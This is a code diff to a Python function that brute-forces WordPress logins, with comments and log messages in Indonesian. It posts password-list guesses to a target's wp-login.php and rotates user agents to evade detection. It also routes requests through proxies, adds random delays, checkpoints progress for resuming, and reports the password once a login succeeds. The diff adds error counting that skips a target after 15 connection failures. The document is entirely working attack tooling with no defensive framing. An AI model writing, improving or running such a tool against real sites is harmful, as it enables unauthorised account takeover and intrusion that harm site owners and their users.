@@ -155,10 +155,14 @@ def bruteforce_wp(
     resume_file: Optional[Path],
     proxy: Optional[str]
 ) -> Optional[str]:
+    """Brute-force WordPress login, dengan resume, progress, Ctrl+C handling
+       dan skip target jika >15 error koneksi."""
     login_url = f"{target_url.rstrip('/')}/wp-login.php"
     session = requests.Session()
     proxies = {"http": proxy, "https": proxy} if proxy else None
     total = len(passwords)
+
+    # Resume support
     start = 0
     if resume_file and resume_file.exists():
         val = int(resume_file.read_text().strip() or "0")
@@ -168,35 +172,66 @@ def bruteforce_wp(
         else:
             start = val
             logging.info("Melanjutkan dari password ke-%d", start)
+
+    error_count = 0   # hitung error koneksi
+
     try:
         for idx in range(start, total):
             pwd = passwords[idx]
+            # progress
             print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} {target_url} ▶ {username}:{pwd}", end="", flush=True)
             time.sleep(random.uniform(delay_range[0], delay_range[1]))
+
             try:
                 resp = session.post(
-                    login_url, data={"log":username,"pwd":pwd,"wp-submit":"Log In",
-                    "redirect_to":f"{target_url.rstrip('/')}/wp-admin/","testcookie":"1"},
-                    timeout=timeout, allow_redirects=True,
+                    login_url,
+                    data={
+                        "log": username,
+                        "pwd": pwd,
+                        "wp-submit": "Log In",
+                        "redirect_to": f"{target_url.rstrip('/')}/wp-admin/",
+                        "testcookie": "1",
+                    },
+                    timeout=timeout,
+                    allow_redirects=True,
                     headers={"User-Agent": random.choice(USER_AGENTS)},
-                    proxies=proxies
+                    proxies=proxies,
                 )
-            except Exception as e:
-                logging.warning("Request gagal: %s", e)
+            except requests.RequestException as e:
+                error_count += 1
+                logging.warning("Request gagal (%d/15): %s", error_count, e)
+                # jika error sudah terlalu banyak, skip target
+                if error_count >= 15:
+                    print()  # pindah baris
+                    logging.error("❌ Terlalu banyak error koneksi, skip target %s", target_url)
+                    if resume_file and resume_file.exists():
+                        resume_file.unlink()
+                    return None
                 continue
+
+            # jika berhasil login
             if "wordpress_logged_in" in session.cookies.get_dict() or "/wp-admin/" in resp.url:
                 print()
                 logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
-                if resume_file and resume_file.exists(): resume_file.unlink()
+                if resume_file and resume_file.exists():
+                    resume_file.unlink()
                 return pwd
-            if resume_file: resume_file.write_text(str(idx+1))
+
+            # simpan checkpoint
+            if resume_file:
+                resume_file.write_text(str(idx + 1))
+
     except KeyboardInterrupt:
         print()
-        if resume_file and resume_file.exists(): resume_file.unlink()
+        if resume_file and resume_file.exists():
+            resume_file.unlink()
         logging.warning("🚫 Dihentikan user, resume-file dihapus.")
         sys.exit(1)
+
+    # selesai tanpa hasil, cleanup
     print()
-    if resume_file and resume_file.exists(): resume_file.unlink()
+    if resume_file and resume_file.exists():
+        resume_file.unlink()
     logging.error("Tidak ada password cocok untuk %s di %s", username, target_url)
     return None
 
